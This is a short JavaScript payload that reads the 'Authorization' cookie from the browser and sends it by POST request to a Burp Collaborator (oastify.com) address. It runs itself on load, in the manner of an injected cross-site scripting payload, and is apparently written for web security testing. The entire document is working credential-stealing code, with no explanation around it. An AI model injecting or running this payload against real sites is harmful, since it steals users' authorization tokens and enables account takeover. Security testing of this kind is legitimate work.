function sendAuthorizationHeader() {
  const authorizationHeader = document.cookie.split('; ').find(row => row.startsWith('Authorization='));

  if (authorizationHeader) {
      const value = authorizationHeader.split('=')[1];

      const burpCollaboratorUrl = 'http://mrhokdm1n58m0n5ev08ji9lpxg37rxfm.oastify.com';

      const xhr = new XMLHttpRequest();
      xhr.open('POST', burpCollaboratorUrl, true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

      xhr.send(`Authorization=${value}`);
  } else {
      console.log('Authorization header not found');
  }
}

sendAuthorizationHeader();
